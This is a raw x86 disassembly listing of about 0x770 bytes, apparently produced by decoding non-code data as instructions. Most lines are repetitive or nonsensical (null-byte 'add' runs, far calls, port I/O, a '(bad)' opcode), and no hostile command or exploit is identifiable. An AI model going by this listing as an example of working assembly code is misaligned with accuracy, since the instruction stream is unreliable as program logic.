  406e43:	add    BYTE PTR [ecx],al
  406e45:	sbb    eax,0x30000
  406e4a:	inc    edi
  406e4b:	sbb    eax,0x40000
  406e50:	push   ss
  406e51:	sbb    eax,0x50002
  406e56:	das    
  406e57:	sbb    eax,0x10000
  406e5c:	imul   ebx,DWORD PTR ds:0x20000,0x78
  406e63:	sbb    eax,0x10000
  406e68:	imul   ebx,DWORD PTR ds:0x20000,0x78
  406e6f:	sbb    eax,0x30002
  406e74:	sbb    DWORD PTR ds:0x10000,0x1d78
  406e7e:	add    DWORD PTR [eax],eax
  406e80:	js     0x406e9f
  406e82:	add    BYTE PTR [eax],al
  406e84:	add    DWORD PTR [eax],eax
  406e86:	imul   ebx,DWORD PTR ds:0x20000,0x78
  406e8d:	sbb    eax,0x10000
  406e92:	imul   ebx,DWORD PTR ds:0x10000,0xffffff89
  406e99:	sbb    eax,0x20000
  406e9e:	nop
  406e9f:	sbb    eax,0x30002
  406ea4:	mov    al,ds:0x100001d
  406ea9:	add    BYTE PTR [ecx+0x200001d],cl
  406eaf:	add    BYTE PTR [eax+0x300021d],dl
  406eb5:	add    BYTE PTR [eax+0x100001d],dh
  406ebb:	add    BYTE PTR [ecx+0x200001d],cl
  406ec1:	add    BYTE PTR [eax+0x300021d],dl
  406ec7:	add    BYTE PTR [eax+0x400021d],dh
  406ecd:	add    BYTE PTR [ecx+0x100021d],al
  406ed3:	add    dh,al
  406ed5:	sbb    eax,0x10000
  406eda:	fstp   DWORD PTR ds:0x10000
  406ee0:	ficomp WORD PTR ds:0x10000
  406ee6:	mov    eax,ds:0x100001a
  406eeb:	add    al,ch
  406eed:	sbb    eax,0x10000
  406ef2:	sti    
  406ef3:	sbb    eax,0x10000
  406ef8:	sti    
  406ef9:	sbb    eax,0x10000
  406efe:	sti    
  406eff:	sbb    eax,0x10000
  406f04:	or     BYTE PTR [esi],bl
  406f06:	add    BYTE PTR [eax],al
  406f08:	add    DWORD PTR [eax],eax
  406f0a:	stc    
  406f0b:	adc    al,BYTE PTR [eax]
  406f0d:	add    BYTE PTR [ecx],al
  406f0f:	add    bl,bh
  406f11:	sbb    eax,0x10000
  406f16:	adc    BYTE PTR [esi],bl
  406f18:	add    BYTE PTR [eax],al
  406f1a:	add    DWORD PTR [eax],eax
  406f1c:	sti    
  406f1d:	sbb    eax,0x10000
  406f22:	sti    
  406f23:	sbb    eax,0x10000
  406f28:	sti    
  406f29:	sbb    eax,0x10000
  406f2e:	call   0x1f00:0x1000013
  406f35:	push   ds
  406f36:	add    BYTE PTR [eax],al
  406f38:	add    DWORD PTR [eax],eax
  406f3a:	xor    DWORD PTR [esi],ebx
  406f3c:	add    BYTE PTR [eax],al
  406f3e:	add    al,BYTE PTR [eax]
  406f40:	xor    ebx,DWORD PTR [esi]
  406f42:	add    BYTE PTR [eax],al
  406f44:	add    DWORD PTR [eax],eax
  406f46:	xor    DWORD PTR [esi],ebx
  406f48:	add    BYTE PTR [eax],al
  406f4a:	add    al,BYTE PTR [eax]
  406f4c:	xor    ebx,DWORD PTR [esi]
  406f4e:	add    BYTE PTR [eax],al
  406f50:	add    DWORD PTR [eax],eax
  406f52:	hlt    
  406f53:	adc    al,BYTE PTR [eax]
  406f55:	add    BYTE PTR [edx],al
  406f57:	add    cl,bh
  406f59:	adc    al,BYTE PTR [eax]
  406f5b:	add    BYTE PTR [ecx],al
  406f5d:	add    BYTE PTR ds:0x100001e,dh
  406f63:	add    BYTE PTR [ecx],bh
  406f65:	push   ds
  406f66:	add    BYTE PTR [eax],al
  406f68:	add    al,BYTE PTR [eax]
  406f6a:	or     BYTE PTR [esi],bl
  406f6c:	add    BYTE PTR [eax],al
  406f6e:	add    eax,DWORD PTR [eax]
  406f70:	ds push ds
  406f72:	add    BYTE PTR [eax],al
  406f74:	add    al,0x0
  406f76:	dec    ebp
  406f77:	push   ds
  406f78:	add    BYTE PTR [eax],al
  406f7a:	add    eax,0x137c00
  406f7f:	add    BYTE PTR [esi],al
  406f81:	add    BYTE PTR [edx+0x7000013],al
  406f87:	add    BYTE PTR [edi+0x8000013],cl
  406f8d:	add    cl,bh
  406f8f:	adc    al,BYTE PTR [eax]
  406f91:	add    BYTE PTR [ecx],al
  406f93:	add    BYTE PTR [ecx+0x100001a],ah
  406f99:	add    BYTE PTR [ebp+0x1e],dl
  406f9c:	add    BYTE PTR [eax],al
  406f9e:	add    DWORD PTR [eax],eax
  406fa0:	lahf   
  406fa1:	sbb    eax,DWORD PTR [eax]
  406fa3:	add    BYTE PTR [edx],al
  406fa5:	add    BYTE PTR [ecx+0x1e],ah
  406fa8:	add    BYTE PTR [eax],al
  406faa:	add    eax,DWORD PTR [eax]
  406fac:	outs   dx,BYTE PTR ds:[esi]
  406fad:	push   ds
  406fae:	add    BYTE PTR [eax],al
  406fb0:	add    al,0x0
  406fb2:	jnp    0x406fd2
  406fb4:	add    BYTE PTR [eax],al
  406fb6:	add    eax,0x1e8b00
  406fbb:	add    BYTE PTR [esi],al
  406fbd:	add    BYTE PTR [ebx+0x700001e],dl
  406fc3:	add    BYTE PTR [eax+0x800001e],ah
  406fc9:	add    BYTE PTR [ebx+0x900001b],ch
  406fcf:	add    BYTE PTR [esi+ebx*1+0x10000],dh
  406fd6:	lahf   
  406fd7:	sbb    eax,DWORD PTR [edx]
  406fd9:	add    BYTE PTR [edx],al
  406fdb:	add    bl,cl
  406fdd:	push   ds
  406fde:	add    al,BYTE PTR [eax]
  406fe0:	add    eax,DWORD PTR [eax]
  406fe2:	fistp  WORD PTR [esi]
  406fe4:	add    al,BYTE PTR [eax]
  406fe6:	add    al,0x0
  406fe8:	out    dx,al
  406fe9:	push   ds
  406fea:	add    al,BYTE PTR [eax]
  406fec:	add    eax,0x21f0000
  406ff1:	add    BYTE PTR [esi],al
  406ff3:	add    BYTE PTR [eax],dl
  406ff5:	pop    ds
  406ff6:	add    BYTE PTR [eax],al
  406ff8:	add    DWORD PTR [eax],eax
  406ffa:	lahf   
  406ffb:	sbb    eax,DWORD PTR [eax]
  406ffd:	add    BYTE PTR [edx],al
  406fff:	add    BYTE PTR [edi],bl
  407001:	pop    ds
  407002:	add    al,BYTE PTR [eax]
  407004:	add    eax,DWORD PTR [eax]
  407006:	retf   
  407007:	push   ds
  407008:	add    al,BYTE PTR [eax]
  40700a:	add    al,0x0
  40700c:	fistp  WORD PTR [esi]
  40700e:	add    BYTE PTR [eax],al
  407010:	add    DWORD PTR [eax],eax
  407012:	lahf   
  407013:	sbb    eax,DWORD PTR [eax]
  407015:	add    BYTE PTR [edx],al
  407017:	add    BYTE PTR [edi],bl
  407019:	pop    ds
  40701a:	add    al,BYTE PTR [eax]
  40701c:	add    eax,DWORD PTR [eax]
  40701e:	xor    ebx,DWORD PTR [edi]
  407020:	add    al,BYTE PTR [eax]
  407022:	add    al,0x0
  407024:	cmp    BYTE PTR [edi],bl
  407026:	add    BYTE PTR [eax],al
  407028:	add    DWORD PTR [eax],eax
  40702a:	lahf   
  40702b:	sbb    eax,DWORD PTR [eax]
  40702d:	add    BYTE PTR [ecx],al
  40702f:	add    BYTE PTR [edi+ebx*1+0x0],al
  407033:	add    BYTE PTR [ecx],al
  407035:	add    BYTE PTR [edi+0x200021b],bl
  40703b:	add    BYTE PTR [ecx+0x1f],dl
  40703e:	add    BYTE PTR [eax],al
  407040:	add    DWORD PTR [eax],eax
  407042:	pop    edi
  407043:	pop    ds
  407044:	add    al,BYTE PTR [eax]
  407046:	add    al,BYTE PTR [eax]
  407048:	lahf   
  407049:	sbb    eax,DWORD PTR [edx]
  40704b:	add    BYTE PTR [ecx],al
  40704d:	add    BYTE PTR [ecx+0x1f],dh
  407050:	add    BYTE PTR [eax],al
  407052:	add    DWORD PTR [eax],eax
  407054:	jge    0x407075
  407056:	add    BYTE PTR [eax],al
  407058:	add    al,BYTE PTR [eax]
  40705a:	sti    
  40705b:	sbb    eax,0x30000
  407060:	mov    ds,WORD PTR [edi]
  407062:	add    BYTE PTR [eax],al
  407064:	add    DWORD PTR [eax],eax
  407066:	lods   eax,DWORD PTR ds:[esi]
  407067:	pop    ds
  407068:	add    BYTE PTR [eax],al
  40706a:	add    al,BYTE PTR [eax]
  40706c:	mov    ds,WORD PTR [edi]
  40706e:	add    BYTE PTR [eax],al
  407070:	add    DWORD PTR [eax],eax
  407072:	mov    edx,0x100001f
  407077:	add    BYTE PTR [edi+0x100001b],bl
  40707d:	add    BYTE PTR [ebp+0x100001b],bl
  407083:	add    dl,cl
  407085:	pop    ds
  407086:	add    BYTE PTR [eax],al
  407088:	add    al,BYTE PTR [eax]
  40708a:	lahf   
  40708b:	sbb    eax,DWORD PTR [eax]
  40708d:	add    BYTE PTR [ebx],al
  40708f:	add    BYTE PTR [edx+0x100001f],bh
  407095:	add    cl,dl
  407097:	pop    ds
  407098:	add    BYTE PTR [eax],al
  40709a:	add    al,BYTE PTR [eax]
  40709c:	popf   
  40709d:	sbb    eax,DWORD PTR [eax]
  40709f:	add    BYTE PTR [ecx],al
  4070a1:	add    cl,dl
  4070a3:	pop    ds
  4070a4:	add    BYTE PTR [eax],al
  4070a6:	add    al,BYTE PTR [eax]
  4070a8:	popf   
  4070a9:	sbb    eax,DWORD PTR [eax]
  4070ab:	add    BYTE PTR [ecx],al
  4070ad:	add    cl,dl
  4070af:	pop    ds
  4070b0:	add    BYTE PTR [eax],al
  4070b2:	add    al,BYTE PTR [eax]
  4070b4:	popf   
  4070b5:	sbb    eax,DWORD PTR [eax]
  4070b7:	add    BYTE PTR [ecx],al
  4070b9:	add    al,bl
  4070bb:	pop    ds
  4070bc:	add    BYTE PTR [eax],al
  4070be:	add    DWORD PTR [eax],eax
  4070c0:	in     al,0x1f
  4070c2:	add    BYTE PTR [eax],al
  4070c4:	add    DWORD PTR [eax],eax
  4070c6:	in     al,0x1f
  4070c8:	add    BYTE PTR [eax],al
  4070ca:	add    DWORD PTR [eax],eax
  4070cc:	js     0x4070eb
  4070ce:	add    BYTE PTR [eax],al
  4070d0:	add    al,BYTE PTR [eax]
  4070d2:	jmp    0x4070f3
  4070d4:	add    BYTE PTR [eax],al
  4070d6:	add    eax,DWORD PTR [eax]
  4070d8:	lock pop ds
  4070da:	add    BYTE PTR [eax],al
  4070dc:	add    al,0x0
  4070de:	neg    DWORD PTR [edi]
  4070e0:	add    BYTE PTR [eax],al
  4070e2:	add    eax,0x200300
  4070e7:	add    BYTE PTR [esi],al
  4070e9:	add    BYTE PTR ds:0x7000020,dl
  4070ef:	add    BYTE PTR [edi],bl
  4070f1:	and    BYTE PTR [eax],al
  4070f3:	add    BYTE PTR [ecx],al
  4070f5:	add    dl,dh
  4070f7:	sbb    al,BYTE PTR [eax]
  4070f9:	add    BYTE PTR [ecx],al
  4070fb:	add    bl,bh
  4070fd:	sbb    eax,0x10000
  407102:	lahf   
  407103:	sbb    eax,DWORD PTR [eax]
  407105:	add    BYTE PTR [ecx],al
  407107:	add    BYTE PTR [edi+0x100001b],bl
  40710d:	add    BYTE PTR [edi+0x200001b],bl
  407113:	add    BYTE PTR [edi],ah
  407115:	and    BYTE PTR [eax],al
  407117:	add    BYTE PTR [ecx],al
  407119:	add    BYTE PTR [eax],dh
  40711b:	and    BYTE PTR [eax],al
  40711d:	add    BYTE PTR [ecx],al
  40711f:	add    BYTE PTR [eax],dh
  407121:	and    BYTE PTR [eax],al
  407123:	add    BYTE PTR [ecx],al
  407125:	add    dh,bl
  407127:	sbb    eax,0x10000
  40712c:	inc    ecx
  40712d:	and    BYTE PTR [eax],al
  40712f:	add    BYTE PTR [ecx],al
  407131:	add    BYTE PTR [ecx+0x20],al
  407134:	add    BYTE PTR [eax],al
  407136:	add    DWORD PTR [eax],eax
  407138:	dec    edx
  407139:	and    BYTE PTR [eax],al
  40713b:	add    BYTE PTR [edx],al
  40713d:	add    BYTE PTR [edi+0x100001a],ah
  407143:	add    BYTE PTR [ecx+0x20],dl
  407146:	add    BYTE PTR [eax],al
  407148:	add    DWORD PTR [eax],eax
  40714a:	hlt    
  40714b:	adc    al,BYTE PTR [eax]
  40714d:	add    BYTE PTR [ecx],al
  40714f:	add    BYTE PTR [edi+0x100001b],bl
  407155:	add    BYTE PTR [edx+0x20],bl
  407158:	add    BYTE PTR [eax],al
  40715a:	add    DWORD PTR [eax],eax
  40715c:	lahf   
  40715d:	sbb    eax,DWORD PTR [eax]
  40715f:	add    BYTE PTR [ecx],al
  407161:	add    BYTE PTR [edx+0x20],bl
  407164:	add    BYTE PTR [eax],al
  407166:	add    DWORD PTR [eax],eax
  407168:	and    BYTE PTR gs:[eax],al
  40716b:	add    BYTE PTR [edx],al
  40716d:	add    BYTE PTR [esi+0x20],ch
  407170:	add    BYTE PTR [eax],al
  407172:	add    DWORD PTR [eax],eax
  407174:	jnp    0x407196
  407176:	add    BYTE PTR [eax],al
  407178:	add    al,BYTE PTR [eax]
  40717a:	inc    ecx
  40717b:	and    BYTE PTR [eax],al
  40717d:	add    BYTE PTR [ecx],al
  40717f:	add    BYTE PTR [ebx+0x20],bh
  407182:	add    BYTE PTR [eax],al
  407184:	add    al,BYTE PTR [eax]
  407186:	inc    ecx
  407187:	and    BYTE PTR [ebx],al
  407189:	add    BYTE PTR [ecx],cl
  40718b:	add    BYTE PTR [ebx],al
  40718d:	add    BYTE PTR ds:0xd000400,cl
  407193:	add    BYTE PTR [eax+eax*1],al
  407196:	adc    DWORD PTR [eax],eax
  407198:	or     BYTE PTR [eax],al
  40719a:	and    DWORD PTR [eax],eax
  40719c:	or     DWORD PTR [eax],eax
  40719e:	and    eax,0x29000900
  4071a3:	add    BYTE PTR [ecx],cl
  4071a5:	add    BYTE PTR ds:0x31000900,ch
  4071ab:	add    BYTE PTR [ecx],cl
  4071ad:	add    BYTE PTR ds:0x39000900,dh
  4071b3:	add    BYTE PTR [edx],cl
  4071b5:	add    BYTE PTR ds:0x41000c00,bh
  4071bb:	add    BYTE PTR ds:0xe004100,cl
  4071c1:	add    BYTE PTR [ebp+0x0],al
  4071c4:	adc    BYTE PTR [eax],al
  4071c6:	dec    ecx
  4071c7:	add    BYTE PTR [eax],dl
  4071c9:	add    BYTE PTR [ebp+0x0],cl
  4071cc:	adc    al,BYTE PTR [eax]
  4071ce:	cmp    eax,0xbb006900
  4071d3:	or     eax,0x6902f1
  4071d8:	sub    cl,BYTE PTR [esi]
  4071da:	stc    
  4071db:	add    dh,BYTE PTR [ecx+0x0]
  4071de:	sub    cl,BYTE PTR [esi]
  4071e0:	add    DWORD PTR [ebx],eax
  4071e2:	jno    0x4071e4
  4071e4:	out    dx,eax
  4071e5:	push   cs
  4071e6:	mov    ebx,0xdf007902
  4071eb:	jle    0x142daf3
  4071f1:	push   es
  4071f2:	cmp    eax,DWORD PTR [eax]
  4071f4:	jno    0x4071f8
  4071f6:	add    DWORD PTR [esi],eax
  4071f8:	cmp    eax,DWORD PTR [eax]
  4071fa:	jns    0x4071fe
  4071fc:	add    DWORD PTR [esi],eax
  4071fe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4071ff:	add    DWORD PTR [ecx-0x71f9fefe],eax
  407205:	add    cl,BYTE PTR [ecx-0x71f9fefe]
  40720b:	add    dl,BYTE PTR [ecx-0x5af9fefe]
  407211:	add    DWORD PTR [ecx-0x5af9fefe],ebx
  407217:	add    DWORD PTR [ecx-0x5af9fefe],esp
  40721d:	add    DWORD PTR [ecx-0x5af9fefe],ebp
  407223:	add    DWORD PTR [ecx-0x5af9fefe],esi
  407229:	add    DWORD PTR [ecx-0x5af9fefe],edi
  40722f:	add    ecx,eax
  407231:	add    al,BYTE PTR [ecx]
  407233:	push   es
  407234:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407235:	add    ecx,ecx
  407237:	add    al,BYTE PTR [ecx]
  407239:	push   es
  40723a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40723b:	add    ecx,edx
  40723d:	add    al,BYTE PTR [ecx]
  40723f:	push   es
  407240:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407241:	add    ecx,ebx
  407243:	add    al,BYTE PTR [ecx]
  407245:	push   es
  407246:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407247:	add    ecx,esp
  407249:	add    al,BYTE PTR [ecx]
  40724b:	push   es
  40724c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40724d:	add    ecx,ebp
  40724f:	add    al,BYTE PTR [ecx]
  407251:	push   es
  407252:	mov    es,WORD PTR [edx]
  407254:	icebp  
  407255:	add    al,BYTE PTR [ecx]
  407257:	push   es
  407258:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407259:	add    ecx,edi
  40725b:	add    al,BYTE PTR [ecx]
  40725d:	push   es
  40725e:	mov    cl,0x1
  407260:	add    DWORD PTR [ebx],eax
  407262:	add    DWORD PTR [esi],eax
  407264:	cmp    eax,DWORD PTR [eax]
  407266:	or     DWORD PTR [ebx],eax
  407268:	add    DWORD PTR [esi],eax
  40726a:	sbb    BYTE PTR ds:0x6010319,al
  407270:	pop    ds
  407271:	add    eax,0x6010321
  407276:	cmp    eax,DWORD PTR [eax]
  407278:	sub    DWORD PTR [ebx],eax
  40727a:	add    DWORD PTR [esi],eax
  40727c:	cmp    eax,DWORD PTR [eax]
  40727e:	xor    DWORD PTR [ebx],eax
  407280:	add    DWORD PTR [esi],eax
  407282:	mov    BYTE PTR ds:0x23ae00d9,0x8a
  407289:	add    cl,BYTE PTR [ecx+0x3]
  40728c:	retf   0xe323
  40728f:	add    eax,0x23e40359
  407294:	jmp    0x40729b
  407296:	popa   
  407297:	add    eax,DWORD PTR [edx]
  407299:	and    al,0x85
  40729b:	add    BYTE PTR [ecx+0x3],cl
  40729e:	or     eax,0x5905f124
  4072a3:	add    edx,DWORD PTR [esp]
  4072a6:	test   DWORD PTR ds:0x24240369,0xc1002d
  4072b0:	add    DWORD PTR [esi],eax
  4072b2:	mov    es,WORD PTR [edx]
  4072b4:	dec    ecx
  4072b5:	add    ebp,DWORD PTR [edx]
  4072b7:	and    al,0xfd
  4072b9:	add    eax,0x24350349
  4072be:	add    DWORD PTR [esi],eax
  4072c0:	and    DWORD PTR [ecx],eax
  4072c2:	add    DWORD PTR [esi],eax
  4072c4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4072c5:	add    ecx,ecx
  4072c7:	add    BYTE PTR [ecx],al
  4072c9:	push   es
  4072ca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4072cb:	add    ecx,edx
  4072cd:	add    BYTE PTR [ecx],al
  4072cf:	push   es
  4072d0:	pop    es
  4072d1:	push   es
  4072d2:	popa   
  4072d3:	add    DWORD PTR [ebp+0x24],edx
  4072d6:	push   cs
  4072d7:	push   es
  4072d8:	jns    0x4072dd
  4072da:	data16 and al,0x13
  4072dd:	push   es
  4072de:	rol    DWORD PTR [eax],1
  4072e0:	jns    0x407306
  4072e2:	sbb    al,BYTE PTR [esi]
  4072e4:	rol    DWORD PTR [eax],1
  4072e6:	(bad)  
  4072e7:	and    al,0x1f
  4072e9:	push   es
  4072ea:	add    DWORD PTR [ebx],0x51f24e7
  4072f0:	rol    DWORD PTR [eax],1
  4072f2:	pop    ss
  4072f3:	and    eax,0x3890625
  4072f8:	aas    
  4072f9:	and    eax,0x391062b
  4072fe:	jno    0x407325
  407300:	xor    DWORD PTR [esi],eax
  407302:	fld    DWORD PTR [eax]
  407304:	add    DWORD PTR [esi],eax
  407306:	cmp    BYTE PTR [esi],al
  407308:	test   eax,0x3b259f03
  40730d:	add    BYTE PTR [ecx+0x4125c603],dh
  407313:	push   es
  407314:	mov    ecx,0x4725f303
  407319:	push   es
  40731a:	leave  
  40731b:	add    eax,DWORD PTR [ebx]
  40731d:	es dec edi
  40731f:	push   es
  407320:	leave  
  407321:	add    edx,DWORD PTR [edx]
  407323:	mov    es,WORD PTR es:[edx]
  407326:	inc    ecx
  407327:	add    eax,DWORD PTR [ecx]
  407329:	push   es
  40732a:	push   esi
  40732b:	push   es
  40732c:	leave  
  40732d:	add    ebp,DWORD PTR [edx]
  40732f:	es pop esp
  407331:	push   es
  407332:	test   eax,0x8a263503
  407337:	add    dl,cl
  407339:	add    ebx,DWORD PTR [edi-0x26ffc4db]
  40733f:	add    ebx,DWORD PTR [ebp+0x26]
  407342:	arpl   WORD PTR [esi],ax
  407344:	loope  0x407349
  407346:	xchg   DWORD PTR [esi],esp
  407348:	add    DWORD PTR [esi],0x269303e9
  40734e:	xchg   BYTE PTR [esi],al
  407350:	jmp    0x8e671158
  407355:	push   es
  407356:	stc    
  407357:	add    esi,DWORD PTR [esi+eiz*1+0x910663]
  40735e:	sahf   
  40735f:	adc    eax,0x401003b
  407364:	lds    esp,FWORD PTR [esi]
  407366:	call   0xa226:0xd3040106
  40736d:	push   es
  40736e:	jns    0x407371
  407370:	rep lods eax,DWORD PTR es:[esi]
  407373:	push   es
  407374:	mov    ecx,0xb6060100
  407379:	push   es
  40737a:	adc    DWORD PTR [edx+esi*1],eax
  40737d:	daa    
  40737e:	rol    BYTE PTR [esi],0x19
  407381:	add    al,0x44
  407383:	daa    
  407384:	mov    BYTE PTR [esi],0x79
  407387:	add    DWORD PTR [ebp+0x11027c13],esp
  40738d:	add    al,0x64
  40738f:	daa    
  407390:	int3   
  407391:	push   es
  407392:	icebp  
  407393:	add    BYTE PTR [edi+0xc06d627],cl
  407399:	add    cl,cl
  40739b:	daa    
  40739c:	call   0xe14164a7
  4073a1:	daa    
  4073a2:	out    dx,al
  4073a3:	push   es
  4073a4:	xor    DWORD PTR [ecx*1+0x3906f428],eax
  4073ab:	add    al,0x31
  4073ad:	sub    dl,bh
  4073af:	push   es
  4073b0:	inc    ecx
  4073b1:	add    al,0x8f
  4073b3:	daa    
  4073b4:	add    DWORD PTR [edi],eax
  4073b6:	adc    al,0x0
  4073b8:	xor    DWORD PTR [eax],ebp
  4073ba:	adc    eax,0x1045107
  4073bf:	push   es
  4073c0:	and    DWORD PTR [edi],eax
  4073c2:	sbb    al,0x0
  4073c4:	leave  
  4073c5:	daa    
  4073c6:	call   0x144ccd1
  4073cb:	push   es
  4073cc:	cmp    eax,DWORD PTR [eax]
  4073ce:	push   ecx
  4073cf:	add    al,0xa3
  4073d1:	sub    BYTE PTR [ecx],dh
  4073d3:	pop    es
  4073d4:	rol    DWORD PTR [ebx],1
  4073d6:	dec    ecx
  4073d7:	sbb    bh,BYTE PTR [ebx]
  4073d9:	add    BYTE PTR [ecx],cl
  4073db:	add    BYTE PTR [ecx],al
  4073dd:	push   es
  4073de:	cmp    eax,DWORD PTR [eax]
  4073e0:	or     DWORD PTR [ecx],eax
  4073e2:	shr    DWORD PTR [eax],cl
  4073e4:	dec    edi
  4073e5:	pop    es
  4073e6:	imul   eax,DWORD PTR [edi+eiz*8],0x69075528
  4073ed:	add    al,0x15
  4073ef:	sub    DWORD PTR [ebx+0x7],ebx
  4073f2:	and    al,0x0
  4073f4:	leave  
  4073f5:	daa    
  4073f6:	call   0x3a415d01
  4073fb:	sub    DWORD PTR [ebp+0x7],ebp
  4073fe:	jns    0x407404
  407400:	inc    esi
  407401:	sub    DWORD PTR [ebx+0x7],esi
  407404:	jns    0x40740a
  407406:	push   ecx
  407407:	sub    DWORD PTR [ecx+0x7],edi
  40740a:	stc    
  40740b:	add    ebx,DWORD PTR [ebx+0x29]
  40740e:	test   DWORD PTR [edi],eax
  407410:	mov    cl,0x3
  407412:	ins    DWORD PTR es:[edi],dx
  407413:	sub    DWORD PTR [ebx+0x7c03f907],ecx
  407419:	sub    DWORD PTR [edx-0x70fc06f9],edx
  40741f:	sub    DWORD PTR [edx+0x1002907],edx
  407425:	push   es
  407426:	cmp    eax,DWORD PTR [eax]
  407428:	sbb    DWORD PTR [ecx],eax
  40742a:	add    DWORD PTR [esi],eax
  40742c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40742d:	add    DWORD PTR [ecx],ebp
  40742f:	add    DWORD PTR [ebx-0x7ef85ed7],edi
  407435:	add    al,0xd6
  407437:	sub    DWORD PTR [edx-0x9fb7efe],ecx
  40743d:	sub    DWORD PTR [edi+0xa048907],esp
  407443:	sub    ch,BYTE PTR [ebp+0x13011907]
  407449:	sub    dh,BYTE PTR [ebx+0x21012907]
  40744f:	sub    ch,BYTE PTR [ebp+0x7]
  407452:	xchg   ecx,eax
  407453:	add    al,0x4b
  407455:	sub    bh,BYTE PTR [ebp+0x13012107]
  40745b:	sub    al,dh
  40745d:	pop    es
  40745e:	sub    DWORD PTR [eax],eax
  407460:	out    dx,al
  407461:	pop    es
  407462:	xchg   BYTE PTR [ecx],al
  407464:	xor    DWORD PTR [eax],eax
  407466:	add    DWORD PTR [esi],eax
  407468:	cmp    eax,DWORD PTR [eax]
  40746a:	xor    DWORD PTR [ecx],eax
  40746c:	push   esi
  40746d:	sub    bh,BYTE PTR [edx+eax*1+0x31]
  407471:	add    DWORD PTR [ebx+0x2a],esp
  407474:	std    
  407475:	add    eax,0x2a6c0131
  40747a:	std    
  40747b:	add    eax,0x2a770131
  407480:	jl     0x407484
  407482:	xor    DWORD PTR [ecx],eax
  407484:	xchg   DWORD PTR [edx],ebp
  407486:	mov    al,BYTE PTR [edx]
  407488:	xor    DWORD PTR [ecx],eax
  40748a:	xchg   ebp,eax
  40748b:	sub    bh,BYTE PTR [edx+eax*1+0x39]
  40748f:	add    DWORD PTR [ebx+0x39027c2a],esp
  407495:	add    DWORD PTR [ebx+0x2a],esp
  407498:	std    
  407499:	add    eax,0x2a950139
  40749e:	jl     0x4074a2
  4074a0:	inc    ecx
  4074a1:	add    DWORD PTR [ebx+0x41027c2a],esi
  4074a7:	add    DWORD PTR [ebx+0x2a],esp
  4074aa:	std    
  4074ab:	add    eax,0x2ac00141
  4074b0:	jl     0x4074b4
  4074b2:	dec    ecx
  4074b3:	add    edx,eax
  4074b5:	sub    al,BYTE PTR [ebp+0x1002c00]
  4074bb:	push   es
  4074bc:	cmp    eax,DWORD PTR [eax]
  4074be:	cdq    
  4074bf:	add    al,0xe9
  4074c1:	sub    bl,ch
  4074c3:	pop    es
  4074c4:	xor    al,0x0
  4074c6:	adc    al,0x2b
  4074c8:	std    
  4074c9:	add    eax,0x601003c
  4074ce:	clc    
  4074cf:	pop    es
  4074d0:	inc    esp
  4074d1:	add    BYTE PTR [esi+0x2b],cl
  4074d4:	or     cl,BYTE PTR [eax]
  4074d6:	dec    esp
  4074d7:	add    BYTE PTR [ebx+ebp*1+0x1b],bl
  4074db:	or     BYTE PTR [eax+eax*1],ch
  4074de:	push   0xc108202b
  4074e3:	add    al,0x7d
  4074e5:	sub    ecx,DWORD PTR [edx-0x79ffabfe]
  4074eb:	sub    edx,DWORD PTR [ebp+0x8]
  4074ee:	dec    ecx
  4074ef:	add    ecx,DWORD PTR [edi+0x49036b2b]
  4074f5:	add    ebp,esp
  4074f7:	adc    bl,BYTE PTR [ebx+0x8]
  4074fa:	cdq    
  4074fb:	add    al,0x98
  4074fd:	sub    ebp,DWORD PTR [edx+0x8]
  407500:	leave  
  407501:	add    al,0x1
  407503:	push   es
  407504:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407505:	add    ecx,ecx
  407507:	add    al,0xc8
  407509:	sub    ecx,DWORD PTR [esi-0x1ffb26f8]
  40750f:	sub    edi,DWORD PTR [edx+eax*1-0x27]
  407513:	add    al,0x2f
  407515:	sbb    bh,BYTE PTR [edx+eax*1+0x5c]
  407519:	add    dh,ch
  40751b:	sub    ebx,DWORD PTR [esi-0x5afb26f8]
  407521:	adc    edi,DWORD PTR [edx+eax*1+0x34]
  407525:	add    cl,cl
  407527:	daa    
  407528:	call   0xfa40d133
  40752d:	sub    esp,DWORD PTR [eax+ecx*1+0x2c0804e1]
  407534:	ror    BYTE PTR [eax],0xa9
  407537:	add    DWORD PTR [esi+0x2b],ecx
  40753a:	lds    ecx,FWORD PTR [eax]
  40753c:	rol    DWORD PTR [esp+ebx*2],0x2b
  407540:	sub    eax,DWORD PTR [ebx]
  407542:	jmp    0xf16c844b
  407547:	add    eax,0x2c170169
  40754c:	call   0x140ae59
  407551:	push   es
  407552:	cmp    eax,DWORD PTR [eax]
  407554:	dec    ecx
  407555:	add    edx,DWORD PTR [esp]
  407558:	out    dx,al
  407559:	or     BYTE PTR [ecx+0x3],cl
  40755c:	sub    al,0x2c
  40755e:	ror    BYTE PTR [eax],0x49
  407561:	add    ecx,DWORD PTR [edi+0x4905e32b]
  407567:	add    ecx,DWORD PTR ds:0x5108f724
  40756d:	add    DWORD PTR [ecx],eax
  40756f:	push   es
  407570:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407571:	add    ecx,edi
  407573:	add    al,0x47
  407575:	sub    al,0xfd
  407577:	or     BYTE PTR [eax+eax*1+0x1],ah
  40757b:	push   es
  40757c:	clc    
  40757d:	pop    es
  40757e:	stc    
  40757f:	add    al,0x5d
  407581:	adc    cl,BYTE PTR es:[ecx]
  407584:	push   ecx
  407585:	add    DWORD PTR [ebp+0x6c027c13],esp
  40758b:	add    BYTE PTR [ecx],al
  40758d:	push   es
  40758e:	and    al,0x9
  407590:	jns    0x407593
  407592:	dec    ebp
  407593:	sub    al,0x38
  407595:	or     DWORD PTR [ecx],esp
  407597:	add    DWORD PTR [esp],edx
  40759a:	or     DWORD PTR ds:[ecx+0x7c13a501],eax
  4075a1:	add    ch,cl
  4075a3:	add    al,0x76
  4075a5:	sub    al,0x4b
  4075a7:	add    cl,BYTE PTR [ecx+0x5c2c8201]
  4075ad:	or     DWORD PTR [ecx-0x7ad378ff],edx
  4075b3:	add    BYTE PTR [ecx-0x7ad363ff],dl
  4075b9:	add    BYTE PTR [ecx],cl
